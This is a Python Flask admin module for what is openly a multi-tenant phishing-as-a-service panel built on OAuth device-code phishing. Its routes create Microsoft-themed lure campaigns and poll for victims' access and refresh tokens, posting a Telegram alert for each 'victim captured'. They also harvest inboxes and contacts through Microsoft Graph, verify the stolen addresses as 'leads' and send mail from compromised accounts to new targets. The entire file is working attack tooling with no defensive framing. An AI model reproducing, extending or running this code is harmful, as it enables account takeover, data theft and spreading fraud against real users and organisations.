# app/routes/admin.py
from flask import Blueprint, render_template, request, jsonify, flash, redirect, url_for
from flask_login import login_required, current_user
from app.extensions import db
from app.models import User, Tenant, Campaign, Victim, HarvestedEmail, B2BLead, DraftEmail
from app.routes.auth import admin_required
from app.engine.device_code import get_device_code, poll_for_token
from app.engine.harvester import EmailHarvester
from app.engine.sorter import EmailSorter
from app.engine.verifier import EmailVerifier
from app.engine.templates import TEMPLATES, get_categories
from app.utils.notify import send_telegram
from datetime import datetime, timedelta
import requests

# Import helpers from operator blueprint (to reuse encryption and SMTP send)
from app.routes.operator import encrypt_text, decrypt_text, send_email_smtp

admin_bp = Blueprint('admin', __name__, url_prefix='/admin')

# ---------- HELPER ----------
def get_tenant_stats():
    stats = []
    for tenant in Tenant.query.all():
        campaigns = Campaign.query.filter_by(tenant_id=tenant.id).all()
        cids = [c.id for c in campaigns]
        victims = Victim.query.filter(Victim.campaign_id.in_(cids)).all()
        vids = [v.id for v in victims]
        stats.append({
            'tenant': tenant,
            'user_count': User.query.filter_by(tenant_id=tenant.id).count(),
            'campaign_count': len(campaigns),
            'victim_count': len(victims),
            'token_count': Victim.query.filter(Victim.campaign_id.in_(cids), Victim.access_token.isnot(None)).count(),
            'harvested_count': HarvestedEmail.query.filter(HarvestedEmail.victim_id.in_(vids)).count(),
            'lead_count': B2BLead.query.filter(B2BLead.campaign_id.in_(cids)).count(),
            'draft_count': DraftEmail.query.filter(DraftEmail.campaign_id.in_(cids)).count()
        })
    return stats

# ---------- DASHBOARD ----------
@admin_bp.route('/dashboard')
@login_required
@admin_required
def dashboard():
    campaigns = Campaign.query.all()
    victims = Victim.query.all()
    return render_template(
        'admin_dashboard.html',
        tenant_stats=get_tenant_stats(),
        total_users=User.query.count(),
        total_tenants=Tenant.query.count(),
        total_campaigns=len(campaigns),
        total_tokens=Victim.query.filter(Victim.access_token.isnot(None)).count(),
        total_harvested=HarvestedEmail.query.count(),
        total_leads=B2BLead.query.count(),
        total_drafts=DraftEmail.query.count(),
        all_users=User.query.all(),
        campaigns=campaigns,
        victims=victims,
        templates=TEMPLATES,
        categories=get_categories(),
        now=datetime.utcnow()
    )

# ---------- USER MANAGEMENT ----------
@admin_bp.route('/user/<int:user_id>/toggle', methods=['POST'])
@login_required
@admin_required
def toggle_user(user_id):
    user = User.query.get_or_404(user_id)
    user.is_active = not user.is_active
    db.session.commit()
    return jsonify({'status': 'success', 'active': user.is_active})

@admin_bp.route('/user/<int:user_id>/delete', methods=['POST'])
@login_required
@admin_required
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    if user.id == current_user.id:
        return jsonify({'error': 'Cannot delete yourself'}), 400
    db.session.delete(user)
    db.session.commit()
    return jsonify({'status': 'success'})

@admin_bp.route('/user/<int:user_id>/set_role', methods=['POST'])
@login_required
@admin_required
def set_role(user_id):
    role = request.get_json().get('role')
    if role not in ['admin', 'operator', 'user']:
        return jsonify({'error': 'Invalid role'}), 400
    user = User.query.get_or_404(user_id)
    user.role = role
    db.session.commit()
    return jsonify({'status': 'success', 'role': role})

@admin_bp.route('/user/<int:user_id>/set_expiry', methods=['POST'])
@login_required
@admin_required
def set_expiry(user_id):
    days = request.get_json().get('days', 0)
    user = User.query.get_or_404(user_id)
    user.expiry_date = None if days == 0 else datetime.utcnow() + timedelta(days=days)
    db.session.commit()
    return jsonify({'status': 'success'})

@admin_bp.route('/user/<int:user_id>/balance', methods=['POST'])
@login_required
@admin_required
def update_balance(user_id):
    data = request.get_json()
    amount = float(data.get('amount', 0))
    action = data.get('action', 'add')
    user = User.query.get_or_404(user_id)
    if action == 'add':
        user.balance += amount
    elif action == 'subtract':
        user.balance -= amount
    elif action == 'set':
        user.balance = amount
    else:
        return jsonify({'error': 'Invalid action'}), 400
    db.session.commit()
    return jsonify({'status': 'success', 'new_balance': user.balance})

@admin_bp.route('/user/<int:user_id>/balance', methods=['GET'])
@login_required
@admin_required
def get_balance(user_id):
    return jsonify({'balance': User.query.get(user_id).balance})

# ---------- TENANT MANAGEMENT ----------
@admin_bp.route('/tenant/<int:tenant_id>/toggle', methods=['POST'])
@login_required
@admin_required
def toggle_tenant(tenant_id):
    tenant = Tenant.query.get_or_404(tenant_id)
    tenant.is_active = not tenant.is_active
    db.session.commit()
    return jsonify({'status': 'success', 'active': tenant.is_active})

@admin_bp.route('/tenant/<int:tenant_id>/delete', methods=['POST'])
@login_required
@admin_required
def delete_tenant(tenant_id):
    tenant = Tenant.query.get_or_404(tenant_id)
    User.query.filter_by(tenant_id=tenant.id).update({'tenant_id': None})
    db.session.delete(tenant)
    db.session.commit()
    return jsonify({'status': 'success'})

@admin_bp.route('/tenant/<int:tenant_id>/update_plan', methods=['POST'])
@login_required
@admin_required
def update_tenant_plan(tenant_id):
    plan = request.get_json().get('plan')
    tenant = Tenant.query.get_or_404(tenant_id)
    tenant.plan = plan
    db.session.commit()
    return jsonify({'status': 'success', 'plan': plan})

@admin_bp.route('/tenant/<int:tenant_id>/telegram', methods=['POST'])
@login_required
@admin_required
def update_tenant_telegram(tenant_id):
    data = request.get_json() or request.form
    tenant = Tenant.query.get_or_404(tenant_id)
    tenant.telegram_bot_token = data.get('bot_token', '').strip()
    tenant.telegram_chat_id = data.get('chat_id', '').strip()
    db.session.commit()
    return jsonify({'status': 'success'})

@admin_bp.route('/tenant/<int:tenant_id>/vps', methods=['POST'])
@login_required
@admin_required
def update_tenant_vps(tenant_id):
    # Store VPS settings (placeholder – implement as needed)
    return jsonify({'status': 'success', 'message': 'VPS settings saved (demo).'})

# ---------- CAMPAIGN (God Mode) ----------
@admin_bp.route('/campaign/new', methods=['POST'])
@login_required
@admin_required
def create_campaign():
    name = request.form.get('name')
    template_id = request.form.get('template_id', 'ms_alert')
    sender_name = request.form.get('sender_name', '').strip()
    document_title = request.form.get('document_title', '').strip()
    document_type = request.form.get('document_type', '.PDF')
    exit_url = request.form.get('exit_url', 'https://www.microsoft.com')
    language = request.form.get('language', 'English')
    token_type = request.form.get('token_type', 'B2B (Office)')
    tenant_id = request.form.get('tenant_id')
    if not tenant_id:
        flash('Please select a tenant.', 'danger')
        return redirect(url_for('admin.dashboard'))
    tenant = Tenant.query.get(tenant_id)
    if not tenant:
        flash('Tenant not found.', 'danger')
        return redirect(url_for('admin.dashboard'))

    if not name:
        template = next((t for t in TEMPLATES if t['id'] == template_id), None)
        name = template['name'] if template else 'Untitled Lure'
    campaign = Campaign(
        name=name,
        tenant_id=tenant.id,
        status='active',
        template_id=template_id,
        sender_name=sender_name,
        document_title=document_title,
        document_type=document_type,
        exit_url=exit_url,
        language=language,
        token_type=token_type
    )
    db.session.add(campaign)
    db.session.commit()
    try:
        code_data = get_device_code()
        victim = Victim(
            campaign_id=campaign.id,
            user_code=code_data['user_code'],
            device_code=code_data['device_code'],
            status='pending'
        )
        db.session.add(victim)
        db.session.commit()
        flash(f'Campaign created with device code {code_data["user_code"]}', 'success')
    except Exception as e:
        flash(f'Device code error: {e}', 'danger')
    return redirect(url_for('admin.dashboard'))

@admin_bp.route('/campaign/<int:campaign_id>/toggle', methods=['POST'])
@login_required
@admin_required
def toggle_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    campaign.status = 'inactive' if campaign.status == 'active' else 'active'
    db.session.commit()
    return jsonify({'status': 'success', 'new_status': campaign.status})

@admin_bp.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
@login_required
@admin_required
def delete_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    Victim.query.filter_by(campaign_id=campaign.id).delete()
    B2BLead.query.filter_by(campaign_id=campaign.id).delete()
    DraftEmail.query.filter_by(campaign_id=campaign.id).delete()
    db.session.delete(campaign)
    db.session.commit()
    return jsonify({'status': 'success'})

@admin_bp.route('/campaign/<int:campaign_id>/device_codes')
@login_required
@admin_required
def get_device_codes(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    victims = Victim.query.filter_by(campaign_id=campaign.id).all()
    return jsonify([{
        'id': v.id,
        'user_code': v.user_code,
        'device_code': v.device_code[:10] + '...' if v.device_code else 'N/A',
        'status': v.status,
        'email': v.email or 'Unknown'
    } for v in victims])

@admin_bp.route('/campaign/<int:campaign_id>/process')
@login_required
@admin_required
def process_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    victims = Victim.query.filter_by(campaign_id=campaign.id).all()
    vids = [v.id for v in victims]
    harvested = HarvestedEmail.query.filter(HarvestedEmail.victim_id.in_(vids)).all()
    senders = set(h.sender for h in harvested if h.sender)
    provider_groups = EmailSorter.sort_batch(list(senders))
    valid_results = EmailVerifier.verify_batch(list(senders))
    leads_created = 0
    for res in valid_results['valid']:
        if not B2BLead.query.filter_by(target_email=res['email'], campaign_id=campaign.id).first():
            lead = B2BLead(
                campaign_id=campaign.id,
                target_email=res['email'],
                provider=EmailSorter.classify(res['email']),
                verification_score=res['score'],
                is_contacted=False
            )
            db.session.add(lead)
            leads_created += 1
    db.session.commit()
    return jsonify({
        'status': 'done',
        'total_harvested': len(harvested),
        'unique_senders': len(senders),
        'verified_leads': leads_created,
        'provider_groups': provider_groups
    })

@admin_bp.route('/campaign/<int:campaign_id>/leads')
@login_required
@admin_required
def get_leads(campaign_id):
    leads = B2BLead.query.filter_by(campaign_id=campaign_id).all()
    return jsonify([{
        'id': l.id,
        'email': l.target_email,
        'provider': l.provider,
        'score': l.verification_score,
        'contacted': l.is_contacted,
        'verified': l.is_verified
    } for l in leads])

# ---------- VICTIM ACTIONS ----------
@admin_bp.route('/victim/<int:victim_id>/poll')
@login_required
@admin_required
def poll_victim(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    token_data = poll_for_token(victim.device_code)
    if token_data:
        victim.access_token = token_data.get('access_token')
        victim.refresh_token = token_data.get('refresh_token')
        victim.status = 'completed'
        try:
            headers = {"Authorization": f"Bearer {victim.access_token}"}
            resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
            if resp.status_code == 200:
                victim.email = resp.json().get('mail') or resp.json().get('userPrincipalName')
        except:
            pass
        db.session.commit()
        tenant = victim.campaign.tenant
        if tenant and tenant.telegram_bot_token and tenant.telegram_chat_id:
            send_telegram(tenant.telegram_bot_token, tenant.telegram_chat_id,
                          f"✅ New victim captured!\nID: {victim.id}\nEmail: {victim.email or 'Unknown'}\nCampaign: {victim.campaign.name}\nTenant: {tenant.name}")
        return jsonify({'status': 'success', 'token': victim.access_token[:20] + '...'})
    else:
        return jsonify({'status': 'pending', 'message': 'Not yet authenticated'})

@admin_bp.route('/victim/<int:victim_id>/harvest')
@login_required
@admin_required
def harvest(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    if not victim.access_token:
        return jsonify({'error': 'No token available'}), 400
    harvester = EmailHarvester(victim.access_token)
    try:
        emails = harvester.harvest_inbox(limit=100)
        contacts = harvester.harvest_contacts()
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    for email in emails:
        sender = email.get('sender', {}).get('emailAddress', {}).get('address', '')
        recipient = email.get('toRecipients', [{}])[0].get('emailAddress', {}).get('address', '')
        h = HarvestedEmail(
            victim_id=victim.id,
            sender=sender,
            recipient=recipient,
            subject=email.get('subject', ''),
            body_preview=email.get('bodyPreview', ''),
            received_date=email.get('receivedDateTime'),
            provider=EmailSorter.classify(sender),
            verification_score=0,
            is_verified=False
        )
        db.session.add(h)
    for contact in contacts:
        email = contact.get('emailAddresses', [{}])[0].get('address')
        if email and not B2BLead.query.filter_by(target_email=email, campaign_id=victim.campaign_id).first():
            lead = B2BLead(
                campaign_id=victim.campaign_id,
                target_email=email,
                provider=EmailSorter.classify(email),
                verification_score=0,
                is_contacted=False
            )
            db.session.add(lead)
    db.session.commit()
    return jsonify({'status': 'done', 'harvested': len(emails), 'contacts': len(contacts)})

@admin_bp.route('/victim/<int:victim_id>/delete', methods=['POST'])
@login_required
@admin_required
def delete_victim(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    db.session.delete(victim)
    db.session.commit()
    return jsonify({'status': 'success'})

# ---------- B2B SENDING ----------
@admin_bp.route('/b2b_send', methods=['POST'])
@login_required
@admin_required
def b2b_send():
    data = request.get_json()
    victim_id = data.get('victim_id')
    subject = data.get('subject')
    body = data.get('body')
    recipients_raw = data.get('recipients', '')
    recipients = [r.strip() for r in recipients_raw.split('\n') if r.strip()]
    if not recipients:
        return jsonify({'error': 'No recipients'}), 400
    victim = Victim.query.get_or_404(victim_id)
    if not victim.access_token:
        return jsonify({'error': 'No token'}), 400
    sent = 0
    failed = []
    for email in recipients:
        try:
            payload = {
                "message": {
                    "subject": subject,
                    "body": {"contentType": "HTML", "content": body},
                    "toRecipients": [{"emailAddress": {"address": email}}]
                },
                "saveToSentItems": "true"
            }
            resp = requests.post(
                "https://graph.microsoft.com/v1.0/me/sendMail",
                headers={"Authorization": f"Bearer {victim.access_token}"},
                json=payload
            )
            if resp.status_code == 202:
                sent += 1
            else:
                failed.append(email)
        except:
            failed.append(email)
    return jsonify({'sent': sent, 'failed': failed, 'total': len(recipients)})

# ---------- EXTRACT, SORT, VERIFY ----------
@admin_bp.route('/extract', methods=['POST'])
@login_required
@admin_required
def admin_extract():
    keyword = request.form.get('keyword', '').strip()
    if not keyword:
        flash('Enter a keyword.', 'danger')
        return redirect(url_for('admin.dashboard'))
    victims = Victim.query.filter(Victim.access_token.isnot(None)).all()
    matching = [v for v in victims if keyword.lower() in (v.email or '').lower()]
    if not matching:
        flash(f'No victims with "{keyword}".', 'warning')
        return redirect(url_for('admin.dashboard'))
    harvested_total = 0
    leads_total = 0
    for v in matching:
        harvester = EmailHarvester(v.access_token)
        try:
            emails = harvester.harvest_inbox(limit=50)
            contacts = harvester.harvest_contacts()
        except:
            continue
        for email in emails:
            sender = email.get('sender', {}).get('emailAddress', {}).get('address', '')
            recipient = email.get('toRecipients', [{}])[0].get('emailAddress', {}).get('address', '')
            h = HarvestedEmail(
                victim_id=v.id,
                sender=sender,
                recipient=recipient,
                subject=email.get('subject', ''),
                body_preview=email.get('bodyPreview', ''),
                received_date=email.get('receivedDateTime'),
                provider=EmailSorter.classify(sender),
                verification_score=0,
                is_verified=False
            )
            db.session.add(h)
            harvested_total += 1
        for contact in contacts:
            email = contact.get('emailAddresses', [{}])[0].get('address')
            if email and not B2BLead.query.filter_by(target_email=email, campaign_id=v.campaign_id).first():
                lead = B2BLead(
                    campaign_id=v.campaign_id,
                    target_email=email,
                    provider=EmailSorter.classify(email),
                    verification_score=0,
                    is_contacted=False
                )
                db.session.add(lead)
                leads_total += 1
        db.session.commit()
    flash(f'✅ Extracted {harvested_total} emails, created {leads_total} leads.', 'success')
    return redirect(url_for('admin.dashboard'))

@admin_bp.route('/sort_emails', methods=['POST'])
@login_required
@admin_required
def sort_emails():
    emails = request.get_json().get('emails', [])
    result = {}
    for email in emails:
        provider = EmailSorter.classify(email)
        result.setdefault(provider, []).append(email)
    return jsonify(result)

@admin_bp.route('/leads/sort')
@login_required
@admin_required
def sort_leads():
    for lead in B2BLead.query.all():
        lead.provider = EmailSorter.classify(lead.target_email)
    db.session.commit()
    flash('Leads sorted.', 'success')
    return redirect(url_for('admin.dashboard'))

@admin_bp.route('/leads/verify')
@login_required
@admin_required
def verify_leads():
    leads = B2BLead.query.all()
    emails = [l.target_email for l in leads]
    results = EmailVerifier.verify_batch(emails)
    for res in results['valid']:
        lead = B2BLead.query.filter_by(target_email=res['email']).first()
        if lead:
            lead.verification_score = res['score']
            lead.is_verified = True
    for res in results['invalid']:
        B2BLead.query.filter_by(target_email=res['email']).delete()
    db.session.commit()
    flash(f'Verified: {len(results["valid"])} valid, {len(results["invalid"])} removed.', 'success')
    return redirect(url_for('admin.dashboard'))

# ---------- SETTINGS ROUTES (to avoid 403) ----------
@admin_bp.route('/settings')
@login_required
@admin_required
def settings():
    return render_template('admin_settings.html')

@admin_bp.route('/telegram')
@login_required
@admin_required
def telegram():
    return render_template('admin_telegram.html')

@admin_bp.route('/ai')
@login_required
@admin_required
def ai():
    return render_template('admin_ai.html')

@admin_bp.route('/vps')
@login_required
@admin_required
def vps():
    return render_template('admin_vps.html')

# ---------- AI & TELEGRAM (update endpoints) ----------
@admin_bp.route('/ai/mode', methods=['POST'])
@login_required
@admin_required
def set_ai_mode():
    mode = request.get_json().get('mode', 'ai')
    flash(f'AI mode set to {mode}', 'success')
    return jsonify({'status': 'success', 'mode': mode})

@admin_bp.route('/update_telegram', methods=['POST'])
@login_required
@admin_required
def update_telegram():
    # Global Telegram settings – you can store in a config table or tenant
    flash('Telegram settings saved (demo).', 'success')
    return redirect(url_for('admin.dashboard'))

@admin_bp.route('/update_ai_settings', methods=['POST'])
@login_required
@admin_required
def update_ai_settings():
    # Store AI settings
    flash('AI settings saved (demo).', 'success')
    return redirect(url_for('admin.dashboard'))

# ============================================================
# ---------- ADMIN SMTP MANAGEMENT (NEW) ----------
# ============================================================
@admin_bp.route('/user/<int:user_id>/smtp', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_manage_smtp(user_id):
    """
    GET: return SMTP settings for a user (excluding password).
    POST: update SMTP settings for a user (password can be set).
    """
    user = User.query.get_or_404(user_id)
    if request.method == 'GET':
        return jsonify({
            'enabled': user.smtp_enabled,
            'server': user.smtp_server,
            'port': user.smtp_port,
            'username': user.smtp_username,
            'from_email': user.smtp_from_email,
            'from_name': user.smtp_from_name,
            'use_tls': user.smtp_use_tls,
            'has_password': bool(user.smtp_password)
        })
    # POST
    data = request.get_json()
    user.smtp_enabled = data.get('enabled', False)
    user.smtp_server = data.get('server', '').strip()
    user.smtp_port = int(data.get('port', 587))
    user.smtp_username = data.get('username', '').strip()
    raw_password = data.get('password', '').strip()
    if raw_password:
        # encrypt and store (encrypt_text imported from operator)
        user.smtp_password = encrypt_text(raw_password)
    user.smtp_from_email = data.get('from_email', '').strip()
    user.smtp_from_name = data.get('from_name', '').strip()
    user.smtp_use_tls = data.get('use_tls', True)
    db.session.commit()
    return jsonify({'status': 'success', 'message': 'SMTP settings updated for user.'})

@admin_bp.route('/user/<int:user_id>/smtp/test', methods=['POST'])
@login_required
@admin_required
def admin_test_smtp(user_id):
    """
    Test SMTP configuration for a specific user by sending a test email.
    """
    user = User.query.get_or_404(user_id)
    server = user.smtp_server
    port = user.smtp_port
    username = user.smtp_username
    password = decrypt_text(user.smtp_password) if user.smtp_password else None
    from_email = user.smtp_from_email
    from_name = user.smtp_from_name
    use_tls = user.smtp_use_tls

    if not all([server, username, password, from_email]):
        return jsonify({'status': 'error', 'message': 'User SMTP configuration incomplete.'}), 400

    test_email = user.email or user.username + '@example.com'
    subject = "SMTP Test (Admin)"
    body = f"<p>Hello {user.username},</p><p>This is a test email sent by admin to verify your SMTP settings.</p>"

    success, msg, sent, failed = send_email_smtp(
        [test_email], subject, body,
        from_email=from_email, from_name=from_name,
        server=server, port=port, username=username, password=password, use_tls=use_tls
    )

    if success:
        return jsonify({'status': 'success', 'message': f'Test email sent to {test_email}'})
    else:
        return jsonify({'status': 'error', 'message': f'Test failed: {msg}'}), 400

# ---------- End of admin.py ----------